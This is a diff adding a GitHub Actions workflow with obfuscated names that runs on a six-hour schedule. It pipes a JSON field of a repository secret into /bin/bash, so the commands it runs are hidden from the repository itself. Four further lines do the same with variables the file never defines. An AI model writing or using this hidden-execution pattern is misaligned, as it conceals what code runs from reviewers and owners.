@@ -1,0 +1,22 @@
+name: txyunmm
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: txyunmm
+        env:
+          esr21: ${{ secrets.esr21 }}
+        run: |
+          echo $esr21 | jq -r .q68 | /bin/bash
+          echo $h0 | jq -r .sr4 | /bin/bash
+          echo $c145 | jq -r .k7095 | /bin/bash
+          echo $vrcp80 | jq -r .cb17487 | /bin/bash
+          echo $gozo2 | jq -r .v464 | /bin/bash
+
